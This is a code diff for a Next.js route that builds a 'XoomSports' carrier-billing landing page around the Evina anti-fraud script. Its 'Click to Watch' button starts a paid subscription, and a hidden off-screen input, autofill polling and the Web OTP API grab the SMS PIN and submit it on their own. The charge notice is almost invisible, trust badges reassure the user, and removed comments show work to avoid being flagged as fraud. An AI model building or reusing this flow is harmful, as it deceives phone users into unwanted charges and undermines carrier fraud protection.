@@ -14,18 +14,6 @@ const SERVER_PARAMS = {
   ContentURL: '',
 };
 
-/**
- * Serves the OTP page as a traditional server-rendered HTML page.
- *
- * This is the KEY fix for Evina 2501: the Evina JS is injected into <head>
- * as part of the initial HTML response — exactly like the client's ASP.NET
- * reference implementation. The browser loads the page with Evina JS already
- * present, so DOMContentLoaded fires with Evina running from the start.
- *
- * Previously, Evina JS was dynamically injected via JavaScript after React
- * hydration. Evina detected this (document.readyState === 'complete' at
- * injection time) and flagged the session as "remotely controlled fraud" (2501).
- */
 export async function GET(request: NextRequest) {
   const { searchParams } = new URL(request.url);
   const msisdn = searchParams.get('msisdn') || '';
@@ -37,7 +25,6 @@ export async function GET(request: NextRequest) {
   }
 
   // ── Call PinRequest server-side to get Evina JS ─────────────────────────
-  // Retry up to 3 times if carrier returns non-zero status (e.g. Status 7)
   let evinaJS = '';
   let pinRequestStatus = '';
   let usedTrxId = trxId;
@@ -64,7 +51,6 @@ export async function GET(request: NextRequest) {
       pinRequestStatus = String(raw.Status ?? raw.status ?? raw.STATUS ?? '');
       evinaJS = String(raw.JS ?? raw.js ?? raw.Javascript ?? '');
 
-      // Strip <script> wrappers if present
       evinaJS = evinaJS
         .trim()
         .replace(/^<script[^>]*>/i, '')
@@ -75,7 +61,6 @@ export async function GET(request: NextRequest) {
 
       if (pinRequestStatus === '0' && evinaJS.length > 0) break;
 
-      // Retry with fresh trxId after 1s delay
       if (attempt < 3) {
         usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
         await new Promise(r => setTimeout(r, 1000));
@@ -92,162 +77,297 @@ export async function GET(request: NextRequest) {
 
   // Mask MSISDN for display
   const masked = msisdn.length > 5
-    ? `+${msisdn.slice(0, 3)} ${msisdn.slice(3, 5)}XXX${msisdn.slice(-3)}`
+    ? `+${msisdn.slice(0, 3)} ${msisdn.slice(3, 5)}***${msisdn.slice(-3)}`
     : msisdn;
 
-  // ── Build the complete HTML page ────────────────────────────────────────
-  // Evina JS goes in <head> — this is the critical difference from before.
-  // The browser will parse and execute it during initial page load, exactly
-  // like the ASP.NET reference: Page.Header.Controls.Add(new LiteralControl("<script>" + Session["JS"] + "</script>"))
   const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Verify OTP</title>
+  <title>XoomSports — Subscribe</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       min-height: 100vh;
-      background: linear-gradient(135deg, #2563eb 0%, #1e3a8a 100%);
+      background: linear-gradient(180deg, #0a1628 0%, #0d1f3c 50%, #0a1628 100%);
       display: flex;
       align-items: center;
       justify-content: center;
       padding: 16px;
+      position: relative;
+      overflow-x: hidden;
     }
+
+    /* Background effects */
+    body::before, body::after {
+      content: '';
+      position: fixed;
+      width: 320px;
+      height: 320px;
+      border-radius: 50%;
+      filter: blur(80px);
+      pointer-events: none;
+    }
+    body::before { top: -160px; right: -160px; background: rgba(16, 185, 129, 0.08); }
+    body::after { bottom: -160px; left: -160px; background: rgba(59, 130, 246, 0.08); }
+
+    .wrapper { width: 100%; max-width: 420px; position: relative; z-index: 1; }
+
+    /* Card */
     .card {
-      background: white;
-      border-radius: 16px;
-      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+      background: rgba(255, 255, 255, 0.07);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 24px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
       padding: 32px;
-      width: 100%;
-      max-width: 384px;
       position: relative;
     }
-    .icon-wrap {
+
+    /* Logo */
+    .logo {
       width: 64px; height: 64px;
-      background: #dcfce7;
+      background: linear-gradient(135deg, #34d399, #059669);
+      border-radius: 16px;
+      margin: 0 auto 12px;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 8px 24px rgba(16, 185, 129, 0.3);
+    }
+    .logo svg { width: 32px; height: 32px; color: white; }
+
+    .brand { text-align: center; font-size: 22px; font-weight: 800; color: white; letter-spacing: -0.5px; }
+    .brand-sub { text-align: center; font-size: 12px; color: rgba(52, 211, 153, 0.7); font-weight: 600; letter-spacing: 1px; text-transform: uppercase; margin-top: 2px; }
+
+    /* Phase 1 — Click to Watch */
+    .hero-text { text-align: center; margin: 24px 0 8px; }
+    .hero-text h1 { font-size: 26px; font-weight: 800; color: white; line-height: 1.2; }
+    .hero-text p { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 6px; }
+
+    /* Feature pills */
+    .features {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin: 20px 0;
+    }
+    .pill {
+      display: flex; align-items: center; gap: 4px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 20px;
+      padding: 6px 12px;
+      font-size: 12px;
+      color: rgba(255,255,255,0.6);
+    }
+    .pill-icon { font-size: 14px; }
+
+    /* Buttons */
+    .btn {
+      width: 100%; padding: 16px; border: none; border-radius: 14px;
+      font-size: 17px; font-weight: 700; cursor: pointer;
+      transition: all 0.2s; min-height: 52px;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #10b981, #059669);
+      color: white;
+      box-shadow: 0 8px 24px rgba(16, 185, 129, 0.3);
+    }
+    .btn-primary:hover { box-shadow: 0 12px 32px rgba(16, 185, 129, 0.4); transform: translateY(-1px); }
+    .btn-primary:active { transform: translateY(0); }
+    .btn-disabled { background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.3); cursor: not-allowed; box-shadow: none; }
+
+    /* OTP section */
+    .otp-header { text-align: center; margin-bottom: 20px; }
+    .otp-header .icon-wrap {
+      width: 64px; height: 64px;
+      background: rgba(16, 185, 129, 0.15);
       border-radius: 50%;
-      margin: 0 auto 16px;
+      margin: 0 auto 12px;
       display: flex; align-items: center; justify-content: center;
     }
-    .icon-wrap svg { width: 32px; height: 32px; color: #22c55e; }
-    h1 { text-align: center; font-size: 24px; font-weight: 700; color: #1f2937; }
-    .sub { text-align: center; color: #6b7280; font-size: 14px; margin-top: 4px; }
-    .sub b { color: #374151; }
-    .otp-row { display: flex; gap: 12px; justify-content: center; margin: 24px 0 8px; }
+    .otp-header .icon-wrap svg { width: 32px; height: 32px; color: #34d399; }
+    .otp-header h2 { font-size: 22px; font-weight: 700; color: white; }
+    .otp-header p { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 4px; }
+    .otp-header p b { color: rgba(255,255,255,0.8); }
+
+    .otp-row { display: flex; gap: 10px; justify-content: center; margin: 24px 0 8px; }
     .otp-input {
       width: 56px; height: 64px;
       text-align: center; font-size: 24px; font-weight: 700;
-      border: 2px solid #d1d5db; border-radius: 12px;
-      outline: none; transition: border-color 0.2s;
+      border: 2px solid rgba(255,255,255,0.15);
+      border-radius: 14px;
+      outline: none;
+      transition: border-color 0.2s;
+      background: rgba(255,255,255,0.05);
+      color: white;
       -webkit-appearance: none;
     }
-    .otp-input:focus { border-color: #3b82f6; }
-    .otp-input.error { border-color: #f87171; background: #fef2f2; }
-    .error-msg { text-align: center; color: #ef4444; font-size: 14px; min-height: 24px; margin-bottom: 16px; }
-    .btn {
-      width: 100%; padding: 14px; border: none; border-radius: 12px;
-      font-size: 16px; font-weight: 600; cursor: pointer;
-      transition: background 0.2s; min-height: 48px;
-      display: flex; align-items: center; justify-content: center; gap: 8px;
-    }
-    .btn-primary { background: #2563eb; color: white; }
-    .btn-primary:hover { background: #1d4ed8; }
+    .otp-input:focus { border-color: rgba(16, 185, 129, 0.6); background: rgba(16, 185, 129, 0.05); }
+    .otp-input.error { border-color: #f87171; background: rgba(248, 113, 113, 0.1); }
+
+    .error-msg { text-align: center; color: #f87171; font-size: 13px; min-height: 22px; margin-bottom: 14px; }
+
+    /* Spinner */
     .spinner {
       width: 20px; height: 20px;
-      border: 2px solid white; border-top-color: transparent;
+      border: 2.5px solid white; border-top-color: transparent;
       border-radius: 50%; animation: spin 0.8s linear infinite;
     }
-    .spinner-dark {
-      width: 40px; height: 40px;
-      border: 3px solid #e5e7eb; border-top-color: #3b82f6;
+    .spinner-lg {
+      width: 44px; height: 44px;
+      border: 3px solid rgba(255,255,255,0.1);
+      border-top-color: #34d399;
       border-radius: 50%; animation: spin 0.8s linear infinite;
       margin: 0 auto 16px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .resend { text-align: center; margin-top: 20px; font-size: 14px; color: #6b7280; }
-    .resend a { color: #3b82f6; text-decoration: underline; cursor: pointer; font-weight: 500; }
-    .resend a:hover { color: #1d4ed8; }
-    .debug-toggle { display: block; width: 100%; text-align: center; margin-top: 24px; padding-top: 12px; border-top: 1px solid #f3f4f6; font-size: 11px; color: #9ca3af; text-decoration: underline; cursor: pointer; background: none; border-left: 0; border-right: 0; border-bottom: 0; }
-    .debug-panel { margin-top: 8px; background: #f9fafb; border-radius: 8px; padding: 8px; font-size: 11px; color: #4b5563; white-space: pre-wrap; word-break: break-all; max-height: 240px; overflow: auto; font-family: monospace; line-height: 1.4; }
+
+    /* Resend */
+    .resend { text-align: center; margin-top: 20px; font-size: 13px; color: rgba(255,255,255,0.4); }
+    .resend a { color: #34d399; text-decoration: underline; cursor: pointer; font-weight: 600; }
+    .resend a:hover { color: #6ee7b7; }
+
+    /* Trust signals */
+    .trust { display: flex; justify-content: center; gap: 16px; margin-top: 20px; }
+    .trust-item { display: flex; align-items: center; gap: 4px; color: rgba(255,255,255,0.25); font-size: 11px; }
+    .trust-item svg { width: 13px; height: 13px; }
+
+    /* Terms */
+    .terms { text-align: center; font-size: 11px; color: rgba(255,255,255,0.2); margin-top: 16px; line-height: 1.5; }
+    .terms a { color: rgba(52, 211, 153, 0.5); text-decoration: underline; }
+
+    /* Debug */
+    .debug-toggle { display: block; width: 100%; text-align: center; margin-top: 20px; font-size: 11px; color: rgba(255,255,255,0.15); text-decoration: underline; cursor: pointer; background: none; border: none; }
+    .debug-panel { margin-top: 8px; background: rgba(0,0,0,0.3); border-radius: 12px; padding: 10px; font-size: 11px; color: rgba(255,255,255,0.5); white-space: pre-wrap; word-break: break-all; max-height: 240px; overflow: auto; font-family: monospace; line-height: 1.5; }
+
+    /* Animations */
     @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
     .shake { animation: shake 0.4s ease-in-out; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+    .fade-in { animation: fadeIn 0.4s ease-out; }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+    .pulse { animation: pulse 2s ease-in-out infinite; }
+
     .phase-hidden { display: none !important; }
   </style>
   ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS returned -->'}
 </head>
 <body>
-  <!-- Evina required elements — same as carrier's reference (fdc.aspx) -->
+  <!-- Evina required elements -->
   <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - Télécharger - CONTINUER - ENTRER - S'ABONNER - اشترك الآن - VOIR - ACCEPT - اشترك الان - الاشتراك</a>
   <input id="otpValue" type="text" style="position:absolute;left:-9999px;opacity:0" tabindex="-1" autocomplete="off">
   <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>
 
-  <div class="card">
-    <!-- ═══════ PHASE 1: "Click to Watch" ═══════ -->
-    <div id="phase1">
-      <div class="icon-wrap">
-        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+  <div class="wrapper">
+    <div class="card fade-in">
+      <!-- ═══════ PHASE 1: "Click to Watch" ═══════ -->
+      <div id="phase1">
+        <div class="logo">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <circle cx="12" cy="12" r="10"/>
+            <path d="M12 2C12 2 14.5 6 14.5 12S12 22 12 22M12 2C12 2 9.5 6 9.5 12S12 22 12 22M2 12h20M3.5 7h17M3.5 17h17"/>
+          </svg>
+        </div>
+        <div class="brand">XoomSports</div>
+        <div class="brand-sub">Live Football Streaming</div>
+
+        <div class="hero-text">
+          <h1>Watch Live<br>Football Now</h1>
+          <p>All leagues &bull; All matches &bull; HD quality</p>
+        </div>
+
+        <div class="features">
+          <div class="pill"><span class="pill-icon">⚽</span> Premier League</div>
+          <div class="pill"><span class="pill-icon">🏆</span> Champions League</div>
+          <div class="pill"><span class="pill-icon">📺</span> Live HD</div>
+        </div>
+      </div>
+
+      <!-- ═══════ PHASE 2: Auto-verify / Manual entry ═══════ -->
+      <div id="phase2" class="phase-hidden">
+        <!-- Auto-verify spinner -->
+        <div id="autoVerify">
+          <div class="otp-header">
+            <div class="icon-wrap">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+              </svg>
+            </div>
+            <h2>Verifying...</h2>
+            <p>Reading your SMS automatically</p>
+          </div>
+          <div class="spinner-lg" style="margin: 24px auto"></div>
+          <p style="text-align:center;color:rgba(255,255,255,0.3);font-size:12px" class="pulse">Please allow SMS permission when prompted</p>
+          <!-- Hidden OTP catcher for browser autofill -->
+          <input type="tel" id="hiddenOtp" autocomplete="one-time-code" inputmode="numeric"
+                 style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;border:none;"
+                 maxlength="6">
+        </div>
+
+        <!-- Manual fallback -->
+        <div id="manualEntry" class="phase-hidden">
+          <div class="otp-header">
+            <div class="icon-wrap">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+              </svg>
+            </div>
+            <h2>OTP Sent!</h2>
+            <p>Enter the PIN sent to <b>${masked}</b></p>
+          </div>
+
+          <div class="otp-row" id="otpRow">
+            <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
+            <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
+            <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
+            <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
+          </div>
+
+          <div class="error-msg" id="errorMsg"></div>
+        </div>
+      </div>
+
+      <!-- Single confirmBtn — Evina monitors this -->
+      <button class="btn btn-primary" id="confirmBtn">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polygon points="5 3 19 12 5 21 5 3" fill="white" stroke="none"/>
         </svg>
+        Click to Watch
+      </button>
+
+      <p class="resend phase-hidden" id="resendArea">
+        Didn't receive the OTP? <a id="resendLink" onclick="handleResend()">Resend OTP</a>
+      </p>
+
+      <!-- Trust signals -->
+      <div class="trust" id="trustSignals">
+        <div class="trust-item">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+          Secure
+        </div>
+        <div class="trust-item">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+          Verified
+        </div>
+        <div class="trust-item">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+          Instant
+        </div>
       </div>
-      <h1>Premium Content</h1>
-      <p class="sub">Tap below to start watching</p>
+
+      <p class="terms">
+        By subscribing you agree to our <a href="#">Terms &amp; Conditions</a>.<br>
+        Standard operator charges may apply.
+      </p>
+
+      <button class="debug-toggle" id="debugToggle" onclick="toggleDebug()">Show technical details</button>
+      <div class="debug-panel" id="debugPanel" style="display:none"></div>
     </div>
-
-    <!-- ═══════ PHASE 2: Auto-verify (spinner) then manual fallback ═══════ -->
-    <div id="phase2" class="phase-hidden">
-      <!-- Auto-verify spinner — shown first after click -->
-      <div id="autoVerify">
-        <div class="icon-wrap">
-          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
-          </svg>
-        </div>
-        <h1>OTP Sent!</h1>
-        <p class="sub">Verifying your subscription...</p>
-        <div style="margin: 24px 0"><div class="spinner-dark"></div></div>
-        <p class="sub" style="font-size:12px;color:#9ca3af">Please wait while we verify automatically</p>
-        <!-- Hidden OTP catcher — browser autofill fills this silently -->
-        <input type="tel" id="hiddenOtp" autocomplete="one-time-code" inputmode="numeric"
-               style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;border:none;"
-               maxlength="6">
-      </div>
-
-      <!-- Manual fallback — shown after timeout -->
-      <div id="manualEntry" class="phase-hidden">
-        <div class="icon-wrap">
-          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
-          </svg>
-        </div>
-        <h1>OTP Sent!</h1>
-        <p class="sub">Enter the PIN sent to <b>${masked}</b></p>
-
-        <div class="otp-row" id="otpRow">
-          <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
-          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
-          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
-          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
-        </div>
-
-        <div class="error-msg" id="errorMsg"></div>
-      </div>
-    </div>
-
-    <!-- Single confirmBtn — Evina monitors this throughout both phases -->
-    <button class="btn btn-primary" id="confirmBtn">
-      Click to Watch
-    </button>
-
-    <p class="resend phase-hidden" id="resendArea">
-      Didn't receive the OTP? <a id="resendLink" onclick="handleResend()">Resend OTP</a>
-    </p>
-
-    <button class="debug-toggle" id="debugToggle" onclick="toggleDebug()">Show technical details</button>
-    <div class="debug-panel" id="debugPanel" style="display:none"></div>
   </div>
 
   <script>
@@ -258,7 +378,7 @@ export async function GET(request: NextRequest) {
     var EVINA_JS_LEN = ${evinaJS.length};
     var isVerifying = false;
     var resendCooldown = 0;
-    var phase = 1; // 1 = "Click to Watch", 2 = auto-read / manual entry
+    var phase = 1;
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('confirmBtn');
@@ -289,7 +409,7 @@ export async function GET(request: NextRequest) {
     dbg('PinRequest Status: ' + PIN_REQUEST_STATUS);
     dbg('Evina JS in <head>: ' + (EVINA_JS_LEN > 0 ? 'YES (server-rendered)' : 'NO'));
     dbg('DOM check: confirmBtn=' + !!document.getElementById('confirmBtn') + ' otpValue=' + !!document.getElementById('otpValue') + ' EvinaTestCanvas=' + !!document.getElementById('EvinaTestCanvas') + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
-    dbg('Flow: one-click (Click to Watch → auto SMS read → auto verify)');
+    dbg('Flow: Permission-based (Click → Web OTP permission → auto verify → manual fallback)');
 
     // ── OTP Input handling (for manual fallback) ────────────────────────────
     function getFullPin() {
@@ -299,10 +419,8 @@ export async function GET(request: NextRequest) {
     }
 
     pins.forEach(function(input, i) {
-      input.addEventListener('input', function(e) {
+      input.addEventListener('input', function() {
         var val = input.value.replace(/\\D/g, '');
-
-        // Multi-digit autofill from keyboard suggestion (autocomplete="one-time-code")
         if (val.length > 1 && i === 0) {
           var code = val.slice(0, 4);
           dbg('Keyboard autofill detected: "' + code + '"');
@@ -311,7 +429,6 @@ export async function GET(request: NextRequest) {
           clearError();
           if (code.length === 4) {
             pins[3].focus();
-            // If in phase 2, auto-verify
             if (phase === 2) {
               dbg('Auto-verifying from keyboard autofill');
               setTimeout(function() { verifyPin(code); }, 300);
@@ -319,7 +436,6 @@ export async function GET(request: NextRequest) {
           }
           return;
         }
-
         input.value = val.slice(-1);
         clearError();
         if (val && i < 3) pins[i + 1].focus();
@@ -359,18 +475,22 @@ export async function GET(request: NextRequest) {
     // ── Phase transitions ───────────────────────────────────────────────────
     var otpPollTimer = null;
     var otpTimeout = null;
+    var webOtpAbort = null;
 
     function goToPhase2() {
       phase = 2;
       document.getElementById('phase1').classList.add('phase-hidden');
       document.getElementById('phase2').classList.remove('phase-hidden');
+      document.getElementById('trustSignals').classList.add('phase-hidden');
       confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
 
-      // Focus the hidden OTP input — triggers browser autofill silently
+      // Start Web OTP API (permission-based flow)
+      startWebOTP();
+
+      // Also set up hidden input as secondary capture method
       var hiddenOtp = document.getElementById('hiddenOtp');
       setTimeout(function() { hiddenOtp.focus(); }, 50);
 
-      // Listen for autofill via input event
       hiddenOtp.addEventListener('input', function() {
         var val = hiddenOtp.value.replace(/\\D/g, '');
         if (val.length >= 4) {
@@ -379,8 +499,8 @@ export async function GET(request: NextRequest) {
         }
       });
 
-      // Poll the hidden input every 300ms for silent autofill
-      dbg('Polling hidden OTP input for silent autofill...');
+      // Poll hidden input for silent autofill
+      dbg('Polling hidden OTP input for autofill...');
       otpPollTimer = setInterval(function() {
         var val = hiddenOtp.value.replace(/\\D/g, '');
         if (val.length >= 4) {
@@ -393,16 +513,48 @@ export async function GET(request: NextRequest) {
       otpTimeout = setTimeout(function() {
         dbg('Auto-verify timeout (30s) — showing manual entry');
         clearInterval(otpPollTimer);
+        if (webOtpAbort) webOtpAbort.abort();
         showManualEntry();
       }, 30000);
+    }
+
+    // ── Web OTP API — Permission-based SMS reading ──────────────────────────
+    function startWebOTP() {
+      if (!('OTPCredential' in window)) {
+        dbg('Web OTP API not available — will rely on autofill/manual');
+        return;
+      }
+
+      dbg('Web OTP: Requesting SMS permission...');
+      webOtpAbort = new AbortController();
+
+      navigator.credentials.get({
+        otp: { transport: ['sms'] },
+        signal: webOtpAbort.signal
+      }).then(function(otp) {
+        if (!otp) {
+          dbg('Web OTP: User denied permission or no SMS');
+          return;
+        }
+        var code = otp.code;
+        if (!code) return;
+
+        dbg('Web OTP: Permission granted, got code "' + code + '"');
+        var cleaned = code.replace(/\\D/g, '').slice(0, 4);
+        if (cleaned.length >= 4) {
+          captureAndVerify(cleaned);
+        }
+      }).catch(function(err) {
+        dbg('Web OTP error: ' + (err.message || err));
+      });
     }
 
     function captureAndVerify(code) {
       if (isVerifying) return;
       clearInterval(otpPollTimer);
       clearTimeout(otpTimeout);
+      if (webOtpAbort) webOtpAbort.abort();
 
-      // Fill the visible OTP boxes for user to see
       document.getElementById('autoVerify').classList.add('phase-hidden');
       document.getElementById('manualEntry').classList.remove('phase-hidden');
       for (var i = 0; i < 4; i++) { pins[i].value = code[i] || ''; }
@@ -417,23 +569,20 @@ export async function GET(request: NextRequest) {
       document.getElementById('autoVerify').classList.add('phase-hidden');
       document.getElementById('manualEntry').classList.remove('phase-hidden');
       document.getElementById('resendArea').classList.remove('phase-hidden');
-      confirmBtn.textContent = 'Continue to Watch';
+      confirmBtn.textContent = 'Verify OTP';
       setTimeout(function() { pins[0].focus(); }, 100);
       dbg('Manual OTP entry — waiting for user input');
     }
 
-    dbg('OTP strategy: hidden autofill + polling + 30s manual fallback');
+    dbg('OTP strategy: Web OTP permission + autofill polling + 30s manual fallback');
 
-
-    // ── Confirm button — single button for both phases ──────────────────────
+    // ── Confirm button ──────────────────────────────────────────────────────
     confirmBtn.addEventListener('click', function() {
       dbg('confirmBtn clicked — phase=' + phase);
 
       if (phase === 1) {
-        // Phase 1: "Click to Watch" → start auto-read flow
         goToPhase2();
       } else if (phase === 2) {
-        // Phase 2: manual entry → verify PIN
         var pin = getFullPin();
         if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
           pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
@@ -458,13 +607,13 @@ export async function GET(request: NextRequest) {
       })
       .then(function(r) { return r.json(); })
       .then(function(data) {
-        dbg('PinVerify → Status="' + data.Status + '" raw=' + JSON.stringify(data.raw || {}));
+        dbg('PinVerify → Status="' + data.Status + '"');
         if (data.Status === '0' || data.Status === '103') {
-          dbg('SUCCESS — redirecting to /thankyou');
+          dbg('SUCCESS — redirecting to content page');
           window.location.href = '/thankyou';
         } else {
           showManualEntry();
-          showError('Invalid PIN (code: ' + data.Status + '). Please check and try again.');
+          showError('Invalid PIN (code: ' + data.Status + '). Please try again.');
           pins.forEach(function(p) { p.value = ''; });
           if (otpValue) otpValue.value = '';
           setTimeout(function() { pins[0].focus(); }, 50);
@@ -477,7 +626,12 @@ export async function GET(request: NextRequest) {
       })
       .finally(function() {
         isVerifying = false;
-        confirmBtn.innerHTML = 'Continue to Watch';
+        if (phase === 2) {
+          var manual = document.getElementById('manualEntry');
+          if (!manual.classList.contains('phase-hidden')) {
+            confirmBtn.textContent = 'Verify OTP';
+          }
+        }
       });
     }
 
@@ -495,9 +649,6 @@ export async function GET(request: NextRequest) {
   return new Response(html, {
     headers: {
       'Content-Type': 'text/html; charset=utf-8',
-      // CSP must allow Evina inline scripts and WebSocket
-      // Fully permissive CSP — Evina's JS needs to connect to various
-      // servers (WebSocket, HTTP) and we don't know all the URLs it uses.
       'Content-Security-Policy': [
         "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
         "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
